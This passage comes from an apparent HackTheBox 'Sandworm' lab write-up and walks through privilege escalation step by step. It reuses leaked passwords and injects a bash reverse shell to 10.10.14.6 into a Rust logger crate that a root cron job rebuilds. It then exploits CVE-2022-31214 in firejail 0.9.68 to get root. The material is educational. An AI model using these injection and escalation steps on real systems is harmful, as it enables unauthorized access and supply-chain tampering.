![image-20231114155756147](/img/image-20231114155756147.png)

The cookie does not work. I’m not completely sure what kind of cookie it is, but there are three base64 blobs separated by “.”. The first (with one “=” for padding added) decodes to `{"_flashes":[{" t":["message","Invalid credentials."]}]}`, so it’s not even a valid cookie.

### SSH

The creds from the httpie config might work for silentobserver with `su`, but atlas can’t run `su`:

```

atlas@sandworm:~$ su - silentobserver 
Could not find command-not-found database. Run 'sudo apt update' to populate it.
su: command not found

```

They do work for SSH as silentobserver:

```

oxdf@hacky$ sshpass -p quietLiketheWind22 ssh silentobserver@ssa.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)
...[snip]...
silentobserver@sandworm:~$ 

```

I can read `user.txt`:

```

silentobserver@sandworm:~$ cat user.txt
76ce3928************************

```

## Shell as atlas

### Enumeration

#### MySQL

With the username and password from the website ([above](#web)) I can now connect to the DB:

```

silentobserver@sandworm:~$ mysql -u atlas -pGarlicAndOnionZ42
...[snip]...
mysql>

```

There’s one interesting database:

```

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| SSA                |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

```

It has one interesting table:

```

mysql> show tables;
+---------------+
| Tables_in_SSA |
+---------------+
| users         |
+---------------+
1 row in set (0.00 sec)

```

With two rows:

```

mysql> select * from users;
+----+----------------+--------------------------------------------------------------------------------------------------------+
| id | username       | password                                                                                               |
+----+----------------+--------------------------------------------------------------------------------------------------------+
|  1 | Odin           | pbkdf2:sha256:260000$q0WZMG27Qb6XwVlZ$12154640f87817559bd450925ba3317f93914dc22e2204ac819b90d60018bc1f |
|  2 | silentobserver | pbkdf2:sha256:260000$kGd27QSYRsOtk7Zi$0f52e0aa1686387b54d9ea46b2ac97f9ed030c27aac4895bed89cb3a4e09482d |
+----+----------------+--------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)

```

I already know the silentobserver password. I’m not able to break the Odin password.

#### Privileged Processes

silentobserver is not allowed to run `sudo`:

```

silentobserver@sandworm:~$ sudo -l
[sudo] password for silentobserver: 
Sorry, user silentobserver may not run sudo on localhost.

```

Looking at SetUID binaries, there are some items in `/opt` that look interesting:

```

silentobserver@sandworm:~$ find / -type f -perm -2000 -o -perm -4000 2>/dev/null
/opt/tipnet/target/debug/tipnet
/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
/usr/local/bin/firejail
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/wall
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/ssh-agent
/usr/bin/umount
/usr/bin/passwd
/usr/bin/expiry
/usr/bin/chsh
/usr/bin/chage
/usr/bin/chfn
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/write.ul
/usr/bin/su
/usr/bin/fusermount3

```

The debug `tipnet` is SetUID, but it’s owned by atlas:

```

silentobserver@sandworm:/$ ls -l /opt/tipnet/target/debug/tipnet
-rwsrwxr-x 2 atlas atlas 59047248 Jun  6 10:00 /opt/tipnet/target/debug/tipnet

```

My initial thought was that it doesn’t really help with privileges, but I haven’t had full access to atlas, only in the jail, so it may. The other two `tipnet`-related files are the same.

#### /opt

In `/opt`, there’s two directories:

```

silentobserver@sandworm:/opt$ ls
crates  tipnet

```

`crates` is from the [Cargo](https://crates.io/) Rust package manager. `tipnet` is custom to this box.

In `crates`, there’s a single package, `logger`:

```

silentobserver@sandworm:/opt/crates$ ls -l
total 4
drwxr-xr-x 5 atlas silentobserver 4096 May  4  2023 logger
silentobserver@sandworm:/opt/crates$ ls -la logger
total 40
drwxr-xr-x 5 atlas silentobserver  4096 May  4  2023 .
drwxr-xr-x 3 root  atlas           4096 May  4  2023 ..
-rw-r--r-- 1 atlas silentobserver 11644 May  4  2023 Cargo.lock
-rw-r--r-- 1 atlas silentobserver   190 May  4  2023 Cargo.toml
drwxrwxr-x 6 atlas silentobserver  4096 May  4  2023 .git
-rw-rw-r-- 1 atlas silentobserver    20 May  4  2023 .gitignore
drwxrwxr-x 2 atlas silentobserver  4096 May  4  2023 src
drwxrwxr-x 3 atlas silentobserver  4096 May  4  2023 target

```

Interestingly, the silentobserver group owns the folder, and has write permissions to the `src` folder.

The `tipnet` directory is the source for a Rust project:

```

silentobserver@sandworm:/opt/tipnet$ ls
access.log  Cargo.lock  Cargo.toml  src  target

```

`access.log` has a last modified time in the last two minutes. At the end of the file, the last lines seem to update every two minutes:

```

silentobserver@sandworm:/opt/tipnet$ tail -10 access.log
[2023-11-14 21:28:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-11-14 21:30:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-11-14 21:32:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-11-14 21:34:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-11-14 21:36:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-11-14 21:38:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-11-14 21:39:15] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-11-14 21:40:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-11-14 21:42:01] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.
[2023-11-14 21:44:02] - User: ROUTINE, Query:  - , Justification: Pulling fresh submissions into database.

```

This is a good sign there’s a cron or other scheduled task running every two minutes. The `Cargo.toml` file defines the Rust package:

```

[package]
name = "tipnet"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
chrono = "0.4"
mysql = "23.0.1"
nix = "0.18.0"
logger = {path = "../crates/logger"}
sha2 = "0.9.0"
hex = "0.4.3"

```

Interestingly, the `logger` library is located in the `crates` directory (as observed). In the `src` folder is a single file, `main.rs`:

```

silentobserver@sandworm:/opt/tipnet/src$ ls -l
total 8
-rwxr-xr-- 1 root atlas 5795 May  4  2023 main.rs

```

#### Processes

There’s nothing too exciting in the process list, but I’ll also run [pspy](https://github.com/DominicBreuker/pspy) to look for crons (first uploading it from my host):

```

silentobserver@sandworm:/dev/shm$ wget 10.10.14.6/pspy64
--2023-11-14 21:34:48--  http://10.10.14.6/pspy64    
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK  
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                              100%[============================================================================>]   2.96M  4.10MB/s    in 0.7s    

2023-11-14 21:34:49 (4.10 MB/s) - ‘pspy64’ saved [3104768/3104768]

silentobserver@sandworm:/dev/shm$ chmod +x ./pspy64
silentobserver@sandworm:/dev/shm$ ./pspy64
...[snip]...

```

Every two minutes, root goes into the `tipnet` directory and runs `cargo run --offline` as atlas:

```

2023/11/14 21:52:01 CMD: UID=0     PID=197175 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh 
2023/11/14 21:52:01 CMD: UID=0     PID=197179 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/11/14 21:52:01 CMD: UID=0     PID=197178 | 
2023/11/14 21:52:01 CMD: UID=1000  PID=197180 | /usr/bin/cargo run --offline 
2023/11/14 21:52:01 CMD: UID=1000  PID=197181 | /usr/bin/cargo run --offline 
2023/11/14 21:52:01 CMD: UID=1000  PID=197182 | /usr/bin/cargo run --offline 
2023/11/14 21:52:01 CMD: UID=1000  PID=197184 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg 
2023/11/14 21:52:01 CMD: UID=1000  PID=197186 | 

```

After 10 seconds, it then runs `clean_c.sh`.

One thing to note about starting a program with `cargo run` is that it rebuilds the binary from source before running it. This is useful when developing a Rust program as it does the compile and run in one step.

### tipnet Analysis

To understand what to hijack, I need to understand how `logger` is used in `tipnet`. For those unfamiliar with Rust, I did 27 videos solving the 2015 [Advent of Code](https://adventofcode.com/) challenges in Rust, available in a playlist [here](https://www.youtube.com/playlist?list=PLJt6nPUdQbiSLYLKKRfydWeMOBwOjzM2y). In [the introduction video](https://www.youtube.com/watch?v=lYyGDeinyrg&list=PLJt6nPUdQbiSLYLKKRfydWeMOBwOjzM2y&index=1&t=4s) for that series, I got over the basics of Rust, comparing it to Python, which might be nice background here.

#### Running tipnet

Trying to run `tipnet` with `cargo run` from `/opt/tipnet` fails. Without `--offline`, it hangs, presumably trying to download the packages (crates) and HTB machines are not connected to the internet. If I give the `--offline` flag, it fails differently:

```

silentobserver@sandworm:/opt/tipnet$ cargo run --offline
error: failed to download `ahash v0.7.6`

Caused by:
  attempting to make an HTTP request, but --offline was specified

```

silentobserver can run the version in `/opt/tipnet/target/debug/`, which is already compiled:

```

silentobserver@sandworm:/opt/tipnet$ ./target/debug/tipnet 
                                                     
             ,,                                      
MMP""MM""YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M""""""  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

Select mode of usage:
a) Upstream 
b) Regular (WIP)
c) Emperor (WIP)
d) SQUARE (WIP)
e) Refresh Indices

```

Running any of `b`-`d` returns a message about this mode not being ported to Rust yet.

Running `a` prompts for a query and a justification, and then just returns. `e` just prints:

```

[!] Refreshing indices!
[+] Pull complete.

```

Rust is very hard to do things like a buffer overflow, and I can read the source, so no need to poke at that yet.

#### lib.rs

`/opt/crates/logger/src/lib.rs` file has one function, `log`:

```

extern create chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}

```

It’s opening the file at `/opt/tipnet/access.log` and writing a line into it.

#### main.rs

`/opt/tipnet/src/main.rs` has several functions, including the menu and the ASCII art observed when running it. There is a connection to a database:

```

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

```

I’ll note that to try to see what’s in there.

The option `e` is what’s being run on the cron to “Refresh Indeces”. That makes a DB query and then writes to the DB, and eventually calls the `logger`:

```

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}

```

### Cargo Hijack

#### Strategy

Given that the binary is compiled each time the cron is executed (because of `cargo run`), if I can modify any of the code, I can get execution as atlas. I noted above that the `main.rs` file was not writable. But the source for the `logger` library that’s imported is:

```

silentobserver@sandworm:/opt/crates/logger/src$ ls -l
total 4
-rw-rw-r-- 1 atlas silentobserver 732 May  4  2023 lib.rs

```

I’ll modify that to get execution as atlas (presumably outside of the jail, as `cargo` wasn’t a binary inside the jail).

#### Note About Cleanup

The cleanup on this box is done in a rather annoying way, where it seems to delete the entire `tipnet` directory and rebuild it. That means if I have a shell in that directory when it happens, it gets lost. I found the best way to modify this is to have the shell in `/opt`, and then `vim crates/logger/src/lib.rs`. Then I can write my changes and get another SSH session to look for results. By leaving `vim` open, even when the cleanup deletes the directory and recreates it, my changes are still in my copy. When I just save again, it will warn me:

![image-20231115072844509](/img/image-20231115072844509.png)

Entering `y` will save over the cleaned copy.

#### Modify lib.rs POC

There’s a Rust struct (think object) named `Command` [[docs](https://doc.rust-lang.org/std/process/struct.Command.html)]. I’ll need to add `use std::process::Command` at the top, and then I’ll put my `Command` invocation at the bottom:

```

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
    
    Command::new("sh")
            .arg("-c")
            .arg("touch /dev/shm/0xdf")
            .output()
            .expect("failed to execute");
}

```

I’ll wait for the next two minute cron, and then there’s a file in `/tmp` owned by atlas:

```

silentobserver@sandworm:/dev/shm$ ls -l
total 0
-rw-rw-r-- 1 atlas atlas 0 Nov 15 12:14 0xdf

```

#### Shell

To get a shell, I’ll modify what runs to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

    Command::new("bash")
            .arg("-c")
            .arg("bash -i >& /dev/tcp/10.10.14.6/443 0>&1")
            .output()
            .expect("failed to execute");
}

```

After a couple minutes, I get a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.218 33814
bash: cannot set terminal process group (211145): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ 

```

And this time, the [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q) works without issue, which is a good signal it’s not in the jail:

```

atlas@sandworm:/opt/tipnet$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
atlas@sandworm:/opt/tipnet$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
atlas@sandworm:/opt/tipnet$ 

```

## Shell as Root

### Enumeration

As atlas now, this shell has an additional group, jailer:

```

atlas@sandworm:/opt/tipnet$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)

```

The only file on the entire filesystem that atlas can access that has the jailer group is `filejail`:

```

atlas@sandworm:/opt/tipnet$ find / -group 1002 2>/dev/null
/usr/local/bin/firejail

```

### CVE-2022-31214

#### Identify Version and Release

The `firejail` version on Sandworm is 0.9.68:

```

atlas@sandworm:/opt/tipnet$ firejail --version
firejail version 0.9.68

Compile time support:
        - always force nonewprivs support is disabled
        - AppArmor support is disabled
        - AppImage support is enabled
        - chroot support is enabled
        - D-BUS proxy support is enabled
        - file transfer support is enabled
        - firetunnel support is enabled
        - networking support is enabled
        - output logging is enabled
        - overlayfs support is disabled
        - private-home support is enabled
        - private-cache and tmpfs as user enabled
        - SELinux support is disabled
        - user namespace support is enabled
        - X11 sandboxing support is enabled

```

The [releases page](https://github.com/netblue30/firejail/releases) on GitHub shows that’s from Feb 6, 2022:

![image-20231115080407843](/img/image-20231115080407843.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

This is helpful to know because there are a lot of older `firejail` exploits.

#### Identify CVE

Searching for “firejail 0.9.68 exploit”, the first hit is a [post on seclists.org](https://seclists.org/oss-sec/2022/q2/188) about CVE-2022-31214. It’s a post that starts:

> The following report describes a local root exploit vulnerability in
> Firejail [1] version 0.9.68 (and likely various older versions). Any
> source code references in this report are based on the 0.9.68 version
> tag in the upstream Git repository.

That seems to match. There’s also the first item in the changelog for the following release, 0.9.70:

> - security: [CVE-2022-31214](https://github.com/advisories/GHSA-m2xv-wgqg-4gxh) - root escalation in –join logic
>   Reported by Matthias Gerstner, working exploit code was provided to our
>   development team. In the same time frame, the problem was independently
>   reported by Birk Blechschmidt. Full working exploit code was also provided.

“Full working exploit code was also provided” is great to hear. I used this same exploit and script before on [Cerberus](/2023/07/29/htb-cerberus.html#escape).

#### Vulnerability Details

Firejail has a “join” functionality, where a user outside the sandbox can run programs and interact inside the jail environment. The post describes how the join functionality runs as effective UID 0 (root).

When trying to join a target process, it checks for a file in the mounted namespace, `/run/firejail/mnt/join`. For the join to work, that must be a regular file, owned by root (as seen from the initial user namespace), and have a size of 1 byte, with that byte being the ASCII character “1”.

The issue here is that a user can create a symlink at `/run/firejail/mnt/join` that points to a file that fulfils the requirements, effectively faking a Firejail process. This allows the attacker to get significant access from within their controller environment.

### Exploitation

#### SSH

I’ll need two shells to run this exploit, so I’ll go for an SSH connection. In `~/.ssh`, I’ll create an `authorized_keys` file with my public key, and make sure the permissions are right:

```

atlas@sandworm:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > authorized_keys
atlas@sandworm:~/.ssh$ chmod 600 authorized_keys

```

Now I can connect:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen atlas@ssa.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)
...[snip]...
atlas@sandworm:~$ 

```

I’ll get two sessions up.

#### Exploit

I’ll download the Python POC script and upload it to Sandworm. If I try to run it without making it executable, it complains:

```

atlas@sandworm:/dev/shm$ python3 firejoin.py 
/dev/shm/firejoin.py needs to have the execute bit set for the exploit to work. Run `chmod +x /dev/shm/firejoin.py` and try again.

```

On fixing that, it works, starting the fake environment where the user can `su -` without a password:

```

atlas@sandworm:/dev/shm$ python3 firejoin.py 
You can now run 'firejail --join=213646' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.

```

In the other shell, I’ll join the jail, and then run `su -`:

```

atlas@sandworm:~$ firejail --join=213646
changing root to /proc/213646/root
Warning: cleaning all supplementary groups
Child process initialized in 9.01 ms
atlas@sandworm:~$ su -
root@sandworm:~#

```

I can read `root.txt`:

```

root@sandworm:~# cat root.txt
fd2706d1************************

```

## Beyond Root

### Exploring Flask

In [this video](https://www.youtube.com/watch?v=zfp7udPF8fs), I’ll dig into the Flask application on Sandworm, see how it starts, how it provides the GPG services, and where the vulnerability is. Then I’ll build a small Flask app of my own and show how the SSTI works.

### Firejail Config

In `/home/atlas/.config/firejail` there’s a file `webapp.profile`. (There is also a backup copy in `/root` that is used by the cleanup script to restore this in case HackTheBox players mess with it). This is what shows up in the Firejail command line, `/usr/local/bin/firejail --profile=webapp flask run`. It’s saying run `flask run` inside the jail with that profile.

The profile has the following:

```

noblacklist /var/run/mysqld/mysqld.sock

hostname sandworm
seccomp

noroot
allusers

caps.drop dac_override,fowner,setuid,setgid
seccomp.drop chmod,fchmod,setuid

private-tmp
private-opt none
private-dev
private-bin /usr/bin/python3,/usr/local/bin/gpg,/bin/bash,/usr/bin/flask,/usr/local/sbin/gpg,/usr/bin/groups,/usr/bin/base64,/usr/bin/lesspipe,/usr/bin/basename,/usr/bin/filename,/usr/bin/bash,/bin/sh,/usr/bin/ls,/usr/bin/cat,/usr/bin/id,/usr/local/libexec/scdaemon,/usr/local/bin/gpg-agent

#blacklist ${HOME}/.ssh
#blacklist /opt

blacklist /home/silentobserver
whitelist /var/www/html/SSA
read-write /var/www/html/SSA/SSA/submissions

noexec /var/www/html/SSA/SSA/submissions

```

The interesting parts are where it sets a private `tmp`, `opt`, `dev`, and `bin`. The first three are basically empty. `bin` gets mapped a handful of binaries (the ones I was able to run from within the jail). It also configures the website directory so that `submissions` can be written to but not executed from.